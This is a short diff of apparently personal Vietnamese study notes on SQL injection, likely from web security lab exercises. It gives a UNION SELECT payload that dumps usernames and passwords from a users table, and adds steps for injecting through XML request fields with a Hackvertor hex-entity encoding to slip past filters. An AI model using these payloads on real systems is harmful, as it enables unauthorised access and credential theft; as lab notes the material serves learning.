@@ -18,3 +18,11 @@ Thay category thành
 SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'
 LẤY username password trong bảng users 
 
+@SQLI XML
+Burp tìm rq có xml
+Thử thay thế value bằng các biểu thức toán học.
+thay thử <storeId>1 UNION SELECT NULL</storeId>
+ko được thì dùng ext hackverto bypass thành giống như thế này 
+<@hex_entities> .........<@/hex_entities>
+<@hex_entities> 1 UNION SELECT username || '~'||  password  FROM users<@/hex_entities> // để lấy username, password
+ 
